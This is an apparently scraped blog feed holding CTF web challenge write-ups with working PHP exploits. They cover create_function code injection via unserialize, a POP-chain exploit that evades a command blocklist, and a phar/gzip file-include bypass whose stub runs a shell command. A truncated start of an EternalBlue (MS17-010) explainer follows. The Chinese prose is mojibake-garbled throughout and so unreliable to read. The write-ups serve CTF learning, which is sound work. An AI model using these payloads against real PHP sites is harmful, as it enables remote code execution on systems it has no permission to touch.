class="line">&#125;</span><br></pre></td></tr></table></figure><p>åº”è¯¥æ˜¯æ”¹ç¼–BUGKU-webçš„unserialize-Noteasyï¼ŒåŸºæœ¬ä¸Šå°±å¤šäº†äº›è¿‡æ»¤ã€‚</p><p>ä¸»è¦æ˜¯è¿™ä¸ªç©æ„$a(â€œâ€,$b);ä½ å¾—æ‰¾ä¸€ä¸ªå‡½æ•°æ¥å—ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºç©ºçš„ï¼Œè¿™é‡Œåˆ©ç”¨create_functionçš„ç‰¹æ€§ï¼ˆ<a href="https://www.cnblogs.com/zzjdbk/p/12980483.html">PHPä»£ç å®¡è®¡ä¹‹create_function()å‡½æ•° - My_Dreams - åšå®¢å›­</a>ï¼‰</p><p>å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå˜é‡å£°æ˜ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºæ‰§è¡Œä»£ç éƒ¨åˆ†ï¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$b</span>);æœ¬è´¨ä¸Šæ˜¯åˆ›å»ºå¹¶è°ƒç”¨äº†ä¸€ä¸ªåŒ¿åå‡½æ•°ï¼š</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lambda_1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆè¿™é‡Œbå¯æ§çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥è€ƒè™‘é—­åˆé€ƒé€¸ï¼Œbçš„è¯ç”¨var_dump(<code>/bi?/?a? /?lag</code>);</p><p>expï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>(<span class="string">&quot;create_function&quot;</span>,<span class="string">&quot;2;&#125;var_dump(`/bi?/?a? /?lag`);/*&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">begin</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;var1 = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;var1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$newFunc</span> = <span class="variable language_">$this</span>-&gt;var2;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newFunc</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">starlord</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var4</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;var4;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;var5-&gt;<span class="title function_ invoke__">ll2</span>(<span class="string">&#x27;b2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">anna</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var6</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var7</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$long</span> = @<span class="variable language_">$this</span>-&gt;var6-&gt;<span class="title function_ invoke__">add</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$long</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;var7-&gt;tt2) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;yamada yamada&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eenndd</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$command</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|tail|more|less|php|tac|cat|sort|shell|nl|sed|awk| /i&quot;</span>, <span class="variable">$this</span>-&gt;command))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;command);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flaag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var11</span>=<span class="string">&quot;1145141919810&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;var11)) == <span class="number">666</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;var10-&gt;hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ISCTF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&quot;ISCTF&quot;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ç‚¹æ˜¯md5(md5($this-&gt;var11)) &#x3D;&#x3D; 666è¿™ä¸ªçš„çˆ†ç ´ï¼Œå› ä¸ºæ˜¯å¼±æ¯”è¾ƒ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># éšæœºç”Ÿæˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼ˆä½ ä¹Ÿå¯ä»¥å›ºå®šä¸€ä¸ªå‰ç¼€ï¼‰</span></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line">    h1 = hashlib.md5(s.encode()).hexdigest()</span><br><span class="line">    h2 = hashlib.md5(h1.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> h2.startswith(<span class="string">&quot;666&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;FOUND!&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;var11 =&quot;</span>, s)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;md5(var11) =&quot;</span>, h1)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;md5(md5(var11)) =&quot;</span>, h2)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>è¿™é¢˜çš„expè¿˜åœ¨ï¼Œç©ºæ ¼è¿‡æ»¤ç”¨%09ï¼ˆè®°å¾—æŠŠpayloadé‡Œé¢çš„ç©ºæ ¼æ¢æˆ%09ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">begin</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eenndd</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$command</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flaag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var11</span>=<span class="string">&quot;bBiksrJO45&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">begin</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">begin</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">flaag</span>();</span><br><span class="line"><span class="variable">$b</span> -&gt; var2 = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span> -&gt; var1 = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$a</span> -&gt; var2 = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title function_ invoke__">eenndd</span>();</span><br><span class="line"><span class="variable">$c</span> -&gt; var10 = <span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$d</span> -&gt; command = <span class="string">&quot;var_dump(`head /f*`);&quot;</span>;</span><br><span class="line"><span class="variable">$x</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç¬¬äºŒç‚¹å°±æ˜¯è¿™é‡Œçš„$bä¹Ÿè¦ç»™var2å»èµ‹å€¼$cï¼Œä¸€å¼€å§‹æ²¡æœ‰å‘ç°ä¸€ç›´æ‰“ä¸é€šï¼Œç„¶åå°±æ²¡å•¥äº†</p><h2 id="include-upload"><a href="#include-upload" class="headerlink" title="include_upload"></a>include_upload</h2><p>é¦–å…ˆæ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œfuzzå‘ç°åç¼€åªèƒ½æ˜¯pngï¼Œå†…å®¹é‡Œé¢ä¸èƒ½æœ‰&lt;?å’Œphpï¼ˆå¤§å°å†™éƒ½ä¸è¡Œï¼‰ï¼Œå…¶å®ƒé©¬ä¹Ÿè¯•è¿‡è§£æä¸äº†ï¼Œè¿™é‡Œè€ƒè™‘ç”¨pharæ–‡ä»¶åŒ…å«ï¼Œincludeç”±äºè¦åŒ…å«çš„æ˜¯æ–‡ä»¶å¤´è€Œä¸æ˜¯å‹ç¼©çš„æ–‡ä»¶åŒ…ï¼Œæ‰€ä»¥è¿™é‡Œä¸ç”¨ä¼ªåè®®ä¹Ÿå¯ä»¥æ‰“</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$file</span>, -<span class="number">4</span>)) == <span class="string">&quot;.png&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span><span class="string">&#x27;./upload/&#x27;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>basenameåªèƒ½è¿”å›æ–‡ä»¶åéƒ¨åˆ†ï¼Œæ‰€ä»¥ç›®å½•ç©¿è¶Šï¼Œä¼ªåè®®éƒ½ç”¨ä¸äº†</p><p>æˆ‘ä»¬ä½¿ç”¨gzå‹ç¼©ä¸€ä¸‹pharæ–‡ä»¶ï¼Œç»•è¿‡æ–‡ä»¶ä¸Šä¼ çš„è¿‡æ»¤ï¼Œä¹‹åå°±å¯ä»¥åŒ…å«äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç”Ÿæˆpharæ–‡ä»¶</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;rufeii&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();     <span class="comment">//å¼€ç¼“å†²</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&lt;?php system(&#x27;tac /f*&#x27;); __HALT_COMPILER();?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title class_">Hello</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;m.txt&quot;</span>,<span class="string">&quot;aaaa&quot;</span>);  <span class="comment">//å†™å…¥m.php</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();      <span class="comment">//å…³ç¼“å†²</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//gzå‘½ä»¤å‹ç¼©</span></span><br><span class="line">gzip phar.phar</span><br><span class="line">å¾—åˆ°ï¼šphar.phar.gz</span><br></pre></td></tr></table></figure><p>010æ‰“å¼€</p><p><img src="/../images/achieve/2025/12/image-20251209200652209.png" alt="image-20251209200652209"></p><p>ç›´æ¥æ”¹åç¼€ä¸Šä¼ å³å¯ï¼Œincludeçš„åº•å±‚ä¼šå»è§£å‹è¯†åˆ«ï¼ˆ<a href="https://fushuling.com/index.php/2025/07/30/%E5%BD%93include%E9%82%82%E9%80%85phar-deadsecctf2025-baby-web/">å½“includeé‚‚é€…pharâ€”â€”DeadsecCTF2025 baby-web â€“ fushulingã®blog</a>ï¼‰</p>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve </tag>
            
            <tag> bottleæ–œä½“å­— </tag>
            
            <tag> åŸå‹é“¾æ±¡æŸ“ </tag>
            
            <tag> ssti </tag>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>äº†è§£æ°¸æ’ä¹‹è“</title>
      <link href="/2025/12/03/%E4%BA%86%E8%A7%A3%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/"/>
      <url>/2025/12/03/%E4%BA%86%E8%A7%A3%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/</url>
      
        <content type="html"><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯æ°¸æ’ä¹‹è“"><a href="#ä»€ä¹ˆæ˜¯æ°¸æ’ä¹‹è“" class="headerlink" title="ä»€ä¹ˆæ˜¯æ°¸æ’ä¹‹è“"></a>ä»€ä¹ˆæ˜¯æ°¸æ’ä¹‹è“</h2><p>æ°¸æ’ä¹‹è“æ˜¯ä¸€ç§åˆ©ç”¨Windowsç³»ç»Ÿçš„SMBåè®®æ¼æ´æ¥è·å–ç³»ç»Ÿæœ€é«˜æƒé™ï¼Œä»¥æ­¤æ¥æ§åˆ¶è¢«å…¥ä¾µçš„è®¡ç®—æœºçš„å·¥å…·</p><p>ç¼–å·ä¸ºï¼š<strong>MS17-010</strong></p><h2 id="SMBåè®®"><a href="#SMBåè®®" class="headerlink" title="SMBåè®®"></a>SMBåè®®</h2><blockquote><p>SMB é€šä¿¡åè®®ä¸»è¦æ˜¯ä½œä¸º Microsoft ç½‘ç»œçš„é€šè®¯åè®®ã€‚SMB æ˜¯åœ¨ä¼šè¯å±‚ï¼ˆsession layerï¼‰å’Œè¡¨ç¤ºå±‚ï¼ˆpresentation layerï¼‰ä»¥åŠå°éƒ¨åˆ†åº”ç”¨å±‚ï¼ˆapplication layerï¼‰çš„åè®®ã€‚SMB ä½¿ç”¨äº† NetBIOS çš„åº”ç”¨ç¨‹åºæ¥å£ ï¼ˆApplication Program Interfaceï¼Œç®€ç§° APIï¼‰ï¼Œä¸€èˆ¬ç«¯å£ä½¿ç”¨ä¸º 139ï¼Œ445</p><p>åè®®æœåŠ¡å™¨ä¿¡æ¯å—ï¼Œå®ƒæ˜¯ä¸€ç§å®¢æˆ·æœº &#x2F; æœåŠ¡å™¨ã€è¯·æ±‚ &#x2F; å“åº”åè®®ï¼Œé€šè¿‡ SMB åè®®å¯ä»¥åœ¨è®¡ç®—æœºé—´å…±äº«æ–‡ä»¶ã€æ‰“å°æœºã€å‘½åç®¡é“ç­‰èµ„æºï¼Œç”µè„‘ä¸Šçš„ç½‘ä¸Šé‚»å±…å°±æ˜¯é  SMB å®ç°çš„ï¼ŒSMB åè®®å·¥ä½œåœ¨åº”ç”¨å±‚å’Œä¼šè¯å±‚ï¼Œå¯ä»¥ç”¨åœ¨ TCP&#x2F;IP åè®®ä¹‹ä¸Š</p></blockquote><p>ç®€å•æ¥è¯´SMBå°±æ˜¯Windows é‡Œçš„â€œå…±äº«æ–‡ä»¶&#x2F;å…±äº«æ‰“å°æœºâ€çš„åè®®ã€‚ä½ åœ¨å†…ç½‘é‡Œå†…ç½‘é‡Œè®¿é—®åˆ«äººç”µè„‘é‡Œçš„å…±äº«æ–‡ä»¶å¤¹å°±æ˜¯SMBåœ¨å·¥ä½œï¼</p><h2 id="SMBåŸç†"><a href="#SMBåŸç†" class="headerlink" title="SMBåŸç†"></a>SMBåŸç†</h2><blockquote><p>é¦–å…ˆå®¢æˆ·ç«¯å‘é€ä¸€ä¸ª SMB negport è¯·æ±‚æ•°æ®æŠ¥ï¼Œå¹¶åˆ—å‡ºå®ƒæ‰€æ”¯æŒçš„æ‰€æœ‰ SMB çš„åè®®ç‰ˆæœ¬ã€‚</p><p>æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚æ¶ˆæ¯åå“åº”è¯·æ±‚ï¼Œå¹¶åˆ—å‡ºå¸Œæœ›ä½¿ç”¨çš„ SMB åè®®ç‰ˆæœ¬ã€‚å¦‚æœæ²¡æœ‰å¯ä»¥ä½¿ç”¨çš„åè®®ç‰ˆæœ¬åˆ™è¿”å› 0XFFFFHï¼Œç»“æŸé€šä¿¡ã€‚</p><p>åè®®ç¡®å®šåï¼Œå®¢æˆ·ç«¯è¿›ç¨‹å‘æœåŠ¡å™¨å‘èµ·ä¸€ä¸ªç”¨æˆ·æˆ–å…±äº«çš„è®¤è¯ï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯é€šè¿‡å‘é€ SessetupX è¯·æ±‚æ•°æ®åŒ…å®ç°çš„ã€‚</p><p>å®¢æˆ·ç«¯å‘é€ä¸€å¯¹ç”¨æˆ·åå’Œå¯†ç æˆ–ä¸€ä¸ªç®€å•å¯†ç åˆ°æœåŠ¡å™¨ï¼Œç„¶åé€šè¿‡æœåŠ¡å™¨å‘é€ä¸€ä¸ª SessetupX åº”ç­”æ•°æ®åŒ…æ¥å…è®¸æˆ–æ‹’ç»æœ¬æ¬¡è¿æ¥ã€‚</p><p>å½“å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å®Œæˆäº†ç£‹å•†å’Œè®¤è¯ä¹‹åï¼Œå®ƒä¼šå‘é€ä¸€ä¸ª Tcon æˆ– TconX SMB æ•°æ®æŠ¥å¹¶åˆ—å‡ºå®ƒæƒ³è®¿é—®çš„ç½‘ç»œèµ„æºçš„åç§°ï¼Œä¹‹åä¼šå‘é€ä¸€ä¸ª TconX åº”ç­”æ•°æ®æŠ¥ä»¥è¡¨ç¤ºæ­¤æ¬¡è¿æ¥æ˜¯å¦æ¥æ”¶æˆ–æ‹’ç»ã€‚</p><p>è¿æ¥åˆ°ç›¸åº”èµ„æºåï¼ŒSMB å®¢æˆ·ç«¯å°±èƒ½å¤Ÿé€šè¿‡ open SMB æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œé€šè¿‡ read SMB è¯»å–æ–‡ä»¶ï¼Œé€šè¿‡ write SMB å†™å…¥æ–‡ä»¶ï¼Œé€šè¿‡ close SMB å…³é—­æ–‡ä»¶</p></blockquote><p>ç®€å•æ¥è¯´å°±æ˜¯ï¼šç¡®å®šSMBåè®®ç‰ˆæœ¬ â†’ å»ºç«‹è¿æ¥ â†’ å®¢æˆ·ç«¯æ“ä½œæ–‡ä»¶</p><h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h2><blockquote><p>SMB æ˜¯ Windows ç³»ç»Ÿä¸­ç”¨äºæ–‡ä»¶å…±äº«ã€æ‰“å°æœåŠ¡çš„ç½‘ç»œåè®®ï¼ŒEternalBlue é’ˆå¯¹çš„æ˜¯ <strong>SMBv1 åè®®æ ˆ</strong>ã€‚</p><p>é—®é¢˜å‡ºåœ¨ <code>Srv.sys</code> å†…æ ¸é©±åŠ¨å¯¹ç‰¹å®š <strong>Trans2 è¯·æ±‚</strong> çš„å¤„ç†ä¸­å­˜åœ¨å†…å­˜é”™è¯¯</p><p>æ”»å‡»è€…ä¼ªé€ ä¸€ä¸ªæ¶æ„ SMB è¯·æ±‚åŒ…ï¼Œä¼ªè£…æˆ 